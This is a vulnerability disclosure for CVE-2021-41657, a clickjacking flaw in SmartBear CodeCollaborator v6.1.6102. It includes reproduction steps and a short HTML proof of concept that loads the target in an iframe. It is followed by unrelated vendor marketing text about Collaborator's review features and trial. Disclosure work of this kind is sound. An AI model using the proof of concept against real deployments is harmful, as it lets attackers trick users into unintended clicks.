|  | Product : SmartBear CodeCollaborator |
| --- | --- |
|  |  |
|  | CVE : CVE-2021-41657 |
|  |  |
|  | Version : v6.1.6102 |
|  |  |
|  | Vulnerability : Improper Restriction of Rendered UI Layers or Frames |
|  |  |
|  | Vulnerability Description : A vulnerability in the web UI of SmartBear CodeCollaborator v6.1.6102 could allow an unauthenticated, remote attacker to affect the integrity of a device via a clickjacking attack. The vulnerability is due to insufficient input validation of iFrame data in HTTP requests that are sent to an affected application. An attacker could exploit this vulnerability by sending crafted HTTP packets with malicious iFrame data. A successful exploit could allow the attacker to perform a clickjacking attack where the user is tricked into clicking a malicious link. |
|  |  |
|  | #Steps to Reproduce |
|  |  |
|  | 1). Create a html file with <anyname> |
|  | 2). Put This code <iframe src="http://ip:port/" height="550px" width="700px"></iframe> |
|  | 3). Now save the file and launch on browser. |
|  |  |
|  | PoC: |
|  |  |
|  | <!DOCTYPE HTML> |
|  | <html lang="en-US"> |
|  | <head> |
|  | <meta charset="UTF-8"> |
|  | <title>I Frame</title> |
|  | </head> |
|  | <body> |
|  | <h3>clickjacking vulnerability</h3> |
|  | <iframe src="http://ip:port/" height="550px" width="700px"></iframe> |

#### Customize Templates, Workflows, and Checklists

Each team and project has unique requirements. Why would the same type of review work for everything? With custom review templates and checklists in Collaborator, it is easy to build peer review frameworks that actually make sense for your team. Once you know what works, you can standardize reviews by setting rules, enforcing workflows, and viewing customizable reports.

#### Trace Versions, Identify Defects and Bugs

Collaborator shows lines of code that have been added between versions in green, lines that have been changed in yellow, and deleted lines in red. Your team can start conversation threads about your code in the left-hand pane and mark things that need to change with a red bug icon. These can be categorized by type and severity.

#### Build Audit Trails with Automatic Reporting

Whether you are trying to drive process improvements or ace an audit, Collaborator makes it easy to pull reports on the data that you need. Easily track defect density, inspection rates, and lines covered so you know how effective your code review process actually is. When faced with an external audit, showing your work is as simple as saving your peer reviews to a zip file.

Collaborator is the peer review tool for software teams that care about code quality and collaboration.

Here's what your 30-day trial could look like:

* Invite other team members to join and get started reviewing source code, requirements, design docs, user stories, and more.
* Connect with your other development tools so that code reviews are a seamless part of your process.
* Have a question? We will be available through chat to help your team get the most out of your trial.
* Set up custom templates, checklists, and groups to ensure that your reviews focus on what's important to your team.
* View reports on your review process to see what types of defects your team is finding and how effective your reviews are.
